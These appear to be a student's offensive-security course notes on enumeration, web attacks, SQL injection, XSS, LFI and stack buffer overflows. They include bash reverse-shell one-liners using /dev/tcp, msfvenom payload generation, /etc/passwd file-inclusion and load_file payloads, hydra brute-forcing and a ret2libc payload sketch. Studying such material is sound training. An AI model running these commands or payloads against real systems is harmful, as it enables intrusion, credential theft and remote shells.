#NMAP SCAN
```bash
nmap -sV -sS IP
udp scan: -sU

scan subnet -> 192.168.1.0/24
```
on windows stealth scans show all ports as closed
stealth scans: -sF -sX -sN

scann all ports: -p-, otherwire scann 1000 most used ports

scanning mode: -T MODE
MODE -> insane, aggressive, normal, polite, sneaky, paranoid

os discovery: -O

nmap scripts: --script=SCRIPT_NAME
scripts located in /usr/share/nmap/scripts
launch every script for a port(no vuln exploit) -> -A
launch every script -> --script "CATEGORIES"
es -> --script "default or vuln"

es -> http-vuln-cve2017


-p$(COMMAND) -> prende le porte dal comando bash

nmap -sP SUBNET -> to ping sweep

-oN FILENAME -> outfile


#SMB

Server Message Block (SAMBA)
ports 139, 445

#SMTP enumeration

telnet ADDRESS 25

command VRFY USERNAME tells if a user exist

#DNS

dns resolution to a specific dns server:
dig @8.8.8.8.8 NAME TYPE

#NC

nc IP PORT
the enter to get banner with information of the service

nc -lvnp *PORT* -> listen with a port

#COMMANDS

```bash
cut -d "/" -f 1 -> get first token
tr '\n' ','  -> substitute first with second
uname -a -> get system info
gcc -m 32 -> compile to 32 bit
base64 -w 0 -> decode in single row eliminating \n
xxd -p -r -> to decode from hex to ascii

find / -type d -perm -u=w -user *USER* 2>/dev/null -> see directories with write permissions
find / type d -writable 2>/dev/null -> like above but consider group permissions
```
#SEARCHSPLOIT

searchsploit SEARCH -> to search exploit in exploit DB

#ON APACHE2

configuration on /var/www/htmt/ -> configuration es. 000-default

#REMOTE MOUNT

cat /etc/exports -> see mount permission

mount -t nfs *IP*:/ ./*DIRECTORY*/

#REVERSE SHELL

/bin/bash -i >&/dev/tcp/IP/PORT 0>&1 
/bin/bash -c '/bin/bash -i >&/dev/tcp/IP/PORT 0>&1'

stabilize shell -> python -c 'import pty; pty.spawn("/bin/bash")'

#OTHER 

in linux /etc/shadow contains hashes

user: $id $salt $hash :other-stuff:...

#JOHN
Crack password using dictionary
john -w=*simple_dic* --rules=all

-stdout -> print tries

different modes:
	incremental -> brute force
	single
	.....


#METASPLOIT
*NOT FOR EXAM*
MSF


*first time*
systemctl start postgresql
systemctl enable postgresql
msfdb init

*to start*
msfconsole

exploit location -> /usr/share/metasploit-framework/modules/exploits/

payload -> code that the attacker uses
exploit -> means by wich the attacker takes advantage
module -> the core of MSF. Tools
listener -> module that let you listen for incoming connections

MODULES:
	listener
	encoders: script that can change the payload (ex. shikata_ga_nai -> change bytes everytime so its not detected as easily by antivirus)
	...

TOOLS:
	Msfvenom: program that create payloads
	
Commands:
	search -> to search exploit
	use *EXPLOIT* -> enter the exploit module
	back -> go back
	show options OR info -> show module options
	set *OPTION* *VALUE* -> set options
	show payloads -> show all payloads	
	exploit OR run -> to launch exploit
	Ctrl + Z -> background shell
	sessions -i -> show sessions


Some modules can take sessions as options. 

multi/handler -> listens for a specific payload

#TOMCAT
If it uses tomcat manager
*URL*/manager/html -> test default passwords
Can deploy war packages

can use msfvenom -> meterpeter reverse shell

#MSFVENOM
msfvenom --list payloads | grep linux -> all linux payloads
msfvenom --list payloads | grep java -> java payloads

msfvenom -p l*PAYLOAD* LHOST=*LHOST* LPORT=*LPORT* -f *FILETYPE* -o meterpeter_out

FILETYPE can be war, elf

staged payload -> small payload that downloads bigger payload (sometimes does not work)

Can load war file to tomcat manager and deploy it. Need to trigger page by accessing the page.

#METERPETER
*NOT FOR EXAM*
route -> can edit port mappings
portfwd -> for port forwarding


#BURPSUITE
extension FoxyProxy to set a proxy -> set burpsuite as proxy

RIGHT CLICK + set to repeater

in HTML Authorization: basic *BASE64 string* -> decoded it contains username and password 

BASE64 -> composed only of letters, number, =, /; often it ends with '=='

#WEB
Enumerate file and directories

robot.txt -> instructions for bots

*tools*:
gobuster -> gobuster dir -u *URL* -w *WORDLIST*
dirsearch100

*nikto -h *IP* -> generic info gathering

DAV/2 Server -> similar to ftp, loads and download files

phpinfo.php -> information on the php configuration

in */etc/host* can configure virtual hosts that are resolved before dns

curl -H "Host: *virtualhost*" *URL*

##GOBUSTER
Enumerating directories, files, dns etc...

/opt/seclists/Discovery/DNS/......			|
/usr/share/wordlists/ 						|
/opt/seclists/.....	(to download)			|-> for wordlists
/usr/share/wordlists/dirb/					|
/usr/share/wordlists/dirbuster/				|

gobuster dir -u *URL* -w *WORDLIST*
gobuster vhost -u *URL* -w *WORDLIST* -> enumerate virtual hosts

to connect to virtual hosts -> edit etc hosts  *IP* *NAME*

##HIDRA
for web

hydra -L *USERNAMELIST* -P *PASSWORDLIST* *IP* http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"

http-get-post for GET
H=*HEADER* for headers
F=*FAILED MESSAGE*

##WFUZZ
Fuzz, sostituisce le parole della wordlist nell'header
wfuzz -> target: *URL*?FUZZ= -> tries the words in the url
wfuzz -H "Host: FUZZ.*NAME*" -w *WORDLIST* *URL*

by default every request has success -> needs to specify filters

hide filters -> --hc/hl/hw/hh   code/lines/words/chars

wfuzz -H "Host: FUZZ.*NAME*" -w *WORDLIST* -hh 10701 *URL* -> hide response of 10701

##PHP Basics
Output -> HTML

PHP:
```php
<?php
 	SCRIPT
?>
```

eval -> validate and execute file
include -> include and eval specified file

$\_GET -> associative array of variable passed to the script
$\_POST -> same as before but with post
$\_REQUEST -> Array with $\_GET, $\_POST, $\_COOKIE

###Local file inclusion
Include local file (local in the server)

Arbitrary file read
```php
<?php
	include($_REQUEST["file"]);
?>
```

*URL*/index.php?file=*FILE*

if not php file the file is shown

.php in a request can be stripped using %00, %2F is / -> can do *URL*/index.php?file=..%2Fetc%2Fpasswd%00 -> up to php v5.3

**ALSO LOG INCLUSION** -> in slides

/proc/self/fd/2 -> in slides

####PHP Filters
*URL*/index.php?*PARAM*=php://filter/convert.base64-encode/resource=index -> encode file in base64 so that it can bypass some checks, can access php code

php://input -> body contents of request is executed -> can put php code

##LFI Reconnaissance

if index.php?page=../../../../var/www/........ -> can search things if not filtered

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion


###Remote File Inclusion

Same as LFI but take resources from another machine

#SQL Injection

use comments 
```sql
-- -for single line comments
# For single line comment
```

```sql
/*
multiline comment 
*/
```

Tautologie -> combine it in the WHERE segment to make it always true

Sometimes do not use ";" -> it depends on the SQL version

In-band -> SQL injections that use the same communication channel as input to dump informations back
Out-of-band -> 2 channels, first used to send payload, second channel used to get back the dump
Inferential (Blind) -> no data transfer, reconstruct information observing db behavior 

Example. in php ```$id = $_GET['id']```


To extrapolate data we can use UNION -> needs to have same columns. Can use ORDER BY *NUM* (ORDER BY 1) to get order columns and see error codes to see if a column exist. ORDER BY 8 to see if there are at least 8 columns. 

To know column type -> UNION SELECT *TIPO1* *TIPO2* -> to see column types; if in the union there are different type, returns an error. It can use NULL as well to check for all types.

Special DB -> information_schema (SQL) that contains info about the DB
There is a variable that contains the version name -> @@version

SCHEMATA table that contains info of the schemas in the DB, 
```sql
SELECT SCHEMA_NAME FROM infomarion_schema.schemata
```

TABLES -> 
```sql
SELECT TABLE_NAME, TABLE_SCHEMA FROM infomation_schema.tables
```
COLUMNS -> name of columns in a table (filter it with WHERE otherwise too much data) -> 
```sql
SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = '*SOMETHING*'
```

If there are not enough columns -> can use grouping functions -> 
```sql
SELECT GROUP_CONCAT(*COLUMN1*, *COLUMN2*, ...) .....
```
If there are different type can use CONVERT(value, type)
LIMIT 1 to limit results -> sometimes query checks number of results

```sql
select load_file('/etc/passwd')
```
load a file -> path might contain special chars -> can use 
```sql
char(47,101)
```
-> that generate a string and can bypass url checks

```sql
SELECT 'into' INTO OUTFILE '/tmp/test'
```

###SQLMAP
pass request http and get DB info

```bash
sqlmap -r *FILE*

--dump -> get dump
--tables -> get tables
--dump-all 
-columns -> get all columns
--dbs -> list all db
-D *NAME* -> select db
--os-shell -> Test for an interactive shell
```

##Blind SQL Injection
No error responce or no data returned.
Use the delay as a side channel. Use 

```sql
if *CONDITION* waitfor delay '0:0:5'
```
to see if a condition is true, but it is very costly to do it manually.

###Second Order injection

Sometimes injecton need more steps.
Example: https://medium.com/ctf-writeups/secnotes-write-up-htb-9d78224d4de3
dvwa: high (Use session cookie)


##JavaScript

Basic Browser model

> Loads content
> Render content -> Parse HTML, scripts and run them
> Respond to events

can inject code in forms, if page is vurnerable try -> <script>alert("hi");</script>
If it succeeds maybe is vurnerable.

###XSS and Cookies
Stealing cookies can authenticate without username and password.

<script>
	alert(document.cookie);
</script>

Get own cookie. But with Cross Site Scripting(*XSS*) can send url to victim and get cookies. -> javascript can make requests. If you have an application that support comments with html markup can insert comments that have javascript in them and steal cookies.

If input filtered substitute <script> </script> with <script a = "b"></script> or ScRiPt.
 <img src="pathchenonesiste.jpg" onerror="alert(1)"/>

Sometimes php encodes html special chars.

##Server Side Template Injection

<!DOCTYPE html>
<html>
<head>
	<title> {{ template }}</title>
</head>
<body>

</body>
</html>

Some languages have templates that can be substituted by the server. Use template in input field and get local variable. -> {{ 7 * 3 }} -> in the response page there is the result

Can inject arbitrary code that is executed by the server. 


#Privilege Escalation

Series of procedures, see GTFOBin, sudo -l.

#Reversing

x86: 
>IA-32 (32 bit)
>x86_64 (64 bit)

##x86

>ESP = stack pointer
>EBP = base pointer
>EIP = instruction pointer

2 equivalent sintaxts:
>AT&T
>Intel

Intel:
>Register naming: eax
>op dst src
>No suffix, but long syntaxt
es:
```
mov 	eax, dword ptr [ebx] 
```
>Memory access: [reg+offset]
>Immediates: 42 (in Hex)
>Register in [] then address

https://www.cs.virginia.edu/~evans/cs216/guides/x86.html

Get data from stack:
>push
>pop (move stack pointer, does not delete data)

Head grows up, Stack grows down (grows to small addresses)

*ABI* convention of the subroutine adopted by the compiler

*cdecl* convention:
>Caller push parameters in inverse order
>Caller cleans up after the function return
>Return value in EAX

In the stack return address to go back after jump. If i can edit stack modifies the behaviour of the CPU and make it call some other function.

##ELF
Linux executable standard format.
>Header (ABI, CPU, ...)
>Section header (Information about sections)
>Program Header (segments used at runtime)

*Reversing* -> understand what the program doues, without source code

>static analysis
>dynamic analysis

##Static
See headers and executables
*stripped* -> if symbols are deleted (function names, etc...)

```bash
strings *FILE* -> see printable strings in file
readelf -> see headers
objdump -M intel -D *EXECUTABLE* (see slides)
```

###Ghidra
Open Source software for static analysis
Show decompiled C code.

###GDB
Install extensions GEF https://gef.readthedocs.io/en/master/

```bash
gdb -q *FILE*
```

```gdb
b *main -> breakpoint at main
run -> run untill breakpoint
ni-> go to next instruction (can use also nexti)
stepi -> when there is a call enter it (step into)
x/1s *ADDRESS* ->  see what it is in the address (as string)
x/ -> print something
checksec -> show the security
x/wx
x/4c
```

##Basic Dynamic analysis
>Execute program
>Trace library calls -> ltrace *FILE*
>Trace system calls -> strace *FILE*
>Debug program -> gdb *FILE*

#Buffer Overflow
Overwrite return addresses so it can be modified and call arbitrary function. Malicious code that set SUID and call /bin/sh.

Insert shellcode, then put NOP to fill the gaps and the overwrite EIP with address of shellcode.
Generate shellcode using tools like msfvenom.

Fill the gaps using \x90 (NOP no instruction).
>How to compute offset after which EIP is overwritten?
```bash
pattern create *LENGH* *PAYLOAD* -> on gdb create a file payload with non repeating pattern of LENGH bytes
./program < payload -> if it generates segmentation fault probably is vurnerable
dmesg or gdb -> find EIP value
pattern offset 0xfound_ value -> on gdb
```

>How to generate shellcode?
1. http://www.shell-storm.org -> contains lot of shellcodes
2. msfvenom 
```bash
msfvenom 
```

------------------------------------
| shellcode | \x90 | shellcode_addr|
------------------------------------
						4 Bytes

To compile vulnerable program
```bash
gcc -m32 -fno-stack-protector -zexecstack .......
```

>How to find shellcode address? Using gdb breakpoint.

##Buffer overflow mitigations

>NX Bit

Stack area no more executable, can't execute code from stack -> it results in a program crash.

Two levels of NX bit:
1. Program-specific NX
	gcc flag -znoexecstack
2. Kernel-specific NX
	No stack execute for all kernel

>ASLR Address Space Layout Randomization

Base address of memory regions is randomized at each program launch. No more fixed addresses for stack, headp, libc

>Stack canaries
Run time check for stack corruption
```bash
gcc -fstack-protector
gcc -fno-stack-protector
```
>Source fortification

##Bypass
>NX bypass

```bash
cat /proc/*PID*/maps
```
-> get memory area, text region is still executable, libc code is still executable so we can reus code from this regions

###ret2libc 
Change return address so tat it points to an address of the libc (standard C library)

1. Change return address to a libc function
2. function: system(command)
3. we want to execute system("/bin/sh")
4. put "/bin/sh" on stack

System address

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
ldd *EXECUTABLE* -> find libc path and base address
```

Sum base and offset to get absolute paths

system = libc_base + 0x....

Need to prepare stack -> see slides

```python
payload = "A" (EIP_OFFSET) + system_addr + exit_addr + binsh_addr
```

Intel x86 is little endian so copy bytes in reverse order
0xabcdef12 === "\x12\xef\xcd\xab"

>ASLR Bypass
```bash
ldd *EXECUTABLE*
```
Gives something different each time.

Don't know libc base address, randomize 3 center bytes. Execute lot of times so that one tipe the random address is the same with the expoilt.


Addresses seen in gdb may be different. Quando si crea un payload ci saranno dentro \00 nell'indirizzo che farà in modo che libc non lo legga e non funzioni se non c'è ASLR. Se c'è solo uno 00 finale si può fare +4 (o -4 o il valore della istruzione prima o dopo) e cambiare allineamento.

```python
struck.pack("<I", address) -> to get addresses in little endian
```

FARE SCRIPT PER OFFSET

#GIT

git reset --hard HEAD -> to reset git directory
